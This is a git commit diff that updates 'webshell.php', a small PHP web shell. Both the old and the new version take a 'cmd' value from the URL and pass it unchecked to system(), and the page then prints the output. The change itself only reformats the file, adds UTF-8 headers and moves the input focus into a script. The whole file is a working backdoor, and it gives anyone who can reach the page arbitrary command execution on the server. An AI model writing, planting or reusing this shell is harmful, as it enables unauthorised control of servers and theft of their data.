688044a918fdc77d86f85faf2ff730bccd2d8055
bongbbanggu <141176496+bongbbanggu@users.noreply.github.com>
2023-08-29 23:20:17 +0900

    Update webshell.php

--- webshell.php
+++ webshell.php
@@ -1,16 +1,19 @@
 <html>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
-</form>
-<pre>
-<?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
-?>
-</pre>
+	<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+		<input type="TEXT" name="cmd" id="cmd" size="80">
+		<input type="SUBMIT" value="Execute">
+	</form>
+	<pre>
+		<?php header("Content-Type:text/html;charset=utf-8");
+
+		if($_GET['cmd'])
+		{
+			system($_GET['cmd']);
+		}
+		?>
+	</pre>
 </body>
+<script>document.getElementById("cmd").focus();</script>
 </html>
